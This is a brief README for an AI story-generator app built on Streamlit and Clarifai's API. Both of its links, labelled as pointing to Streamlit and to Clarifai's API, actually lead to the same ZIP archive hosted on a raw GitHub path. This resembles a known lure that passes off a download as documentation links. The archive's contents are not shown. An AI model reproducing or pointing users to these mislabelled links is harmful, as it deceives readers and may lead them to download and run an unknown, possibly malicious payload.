# WordWhiz - AI Story Generator

This LLM powered [streamlit](https://raw.githubusercontent.com/Kashika02/AI_Story_Generator/main/denumeral/AI_Story_Generator.zip) application can generate a short story based on few **lines** or an **image** uploaded by the user.

This uses [Clarifai's API](https://raw.githubusercontent.com/Kashika02/AI_Story_Generator/main/denumeral/AI_Story_Generator.zip) to access the models like GPT-3, GPT-4 and BLIP through their python gRPC client.
